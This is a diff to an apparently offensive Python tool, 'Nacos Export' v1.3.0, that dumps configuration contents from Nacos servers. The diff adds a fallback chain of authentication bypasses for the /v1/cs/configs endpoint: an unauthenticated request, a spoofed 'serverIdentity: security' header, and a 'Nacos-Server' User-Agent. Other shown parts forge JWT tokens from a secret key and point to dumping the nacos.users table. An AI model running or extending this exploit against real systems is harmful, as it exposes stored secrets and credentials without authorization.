@@ -11,12 +11,12 @@ import base64
 PROXY = {
     # "http": "127.0.0.1:8080"
 }
-
 HEADER = {
     'Accept': 'application/json, text/plain, */*',
     'Content-Type': 'application/x-www-form-urlencoded',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
 }
+COUNT = 0
 
 def login(target: str, username: str, password: str) -> str:
     token = None
@@ -68,13 +68,16 @@ def print_output(namespace: str, group:str, dataId: str, content: str):
 ##################################################
 """.format(namespace=namespace, group=group, dataid=dataId ))
     print(content, "\n")
+    global COUNT
+    COUNT += 1
 
 def dump_config_content(target: str, token: str):
     namespaces = get_namespaces(target, token)
-    count = 0
-    path = "/v1/cs/configs"
+    bypass_method = 1
     for namespace in namespaces:
-        params = {
+        if namespace["configCount"] == 0:
+            namespace["configCount"] = 1 
+        PARAMS = {
             "search": "accurate",
             "dataId": "",
             "group": "",
@@ -87,32 +90,25 @@ def dump_config_content(target: str, token: str):
         }
         # bypass
         if token == "":
-            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
-            if resp.status_code == 200:
-                resp_json = resp.json()
-                for item in resp_json['pageItems']:
-                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
-                    count = count + 1
-            else:
+            if bypass_method == 1:
+                if not request_contents(target, HEADER, PARAMS):
+                    bypass_method = 2
+            if bypass_method == 2:
                 HEADER['serverIdentity'] = "security"
-                resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
-                if resp.status_code == 200:
-                    resp_json = resp.json()
-                    for item in resp_json['pageItems']:
-                        print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
-                        count = count + 1
+                if not request_contents(target, HEADER, PARAMS):
+                    del HEADER['serverIdentity']
+                    bypass_method = 3
+            if bypass_method == 3:
+                HEADER['User-Agent'] = "Nacos-Server"
+                if not request_contents(target, HEADER, PARAMS):
+                    print("[-] Cannot bypass")
+        # token
         else:
             HEADER["Accesstoken"] = token
-            params["accessToken"] = token
-            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
-            if resp.status_code == 200:
-                resp_json = resp.json()
-                for item in resp_json["pageItems"]:
-                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
-                    count = count + 1
-    
-    print("[+] Count: ", count)
-
+            PARAMS["accessToken"] = token
+            if not request_contents(target, HEADER, PARAMS):
+                print("[-] Token Invalid.")
+ 
 def dump_sql(target):
     # dbs_query = "select * from sys.sysschemas"
     # users_query = "select * from nacos.users"
@@ -155,10 +151,20 @@ def gen_token(target: str, secretkey: str) -> str:
     print("JWT TOKEN: ", jwt_token)
     return jwt_token
 
-
+def request_contents(target: str, header: dict, param:dict) -> bool:
+    path = "/v1/cs/configs"
+    resp = requests.get(target + path, headers=header, params=param, proxies=PROXY, verify=False)
+    if resp.status_code == 200:
+        resp_json = resp.json()
+        for item in resp_json["pageItems"]:
+            print_output(param["tenant"], item["group"], item["dataId"], item["content"])
+        
+        return True
+    else:
+        return False
 
 def usage(name: str):
-    ver = "v1.2.1"
+    ver = "v1.3.0"
     print("""
  ______________
 < Nacos Export >         @Author: Arm!tage
@@ -191,16 +197,16 @@ if __name__ == '__main__':
         exit(0)
 
     target = sys.argv[1].rstrip('/')
-    print("[+] Target: ", target)
+    print("[+] Target:", target)
     token = ""
     if len(sys.argv) == 4:
         if sys.argv[2] == "secretkey":
-            print("[+] SecertKey: ", sys.argv[3])
+            print("[+] SecertKey:", sys.argv[3])
             token = gen_token(target, sys.argv[2])
             dump_config_content(target, token)
         else:
-            print("[+] Username: ", sys.argv[2])
-            print("[+] Password: ", sys.argv[3])
+            print("[+] Username:", sys.argv[2])
+            print("[+] Password:", sys.argv[3])
             print("\n")
             token = login(target, sys.argv[2], sys.argv[3])
             dump_config_content(target, token)
@@ -211,7 +217,9 @@ if __name__ == '__main__':
         elif sys.argv[2] == "sql":
             dump_sql(target)
         else:
-            print("[+] Token: ", sys.argv[2])
+            print("[+] Token:", sys.argv[2])
             print("\n")
             token = sys.argv[2]
             dump_config_content(target, token)
+
+    print("[+] Count: ", COUNT)
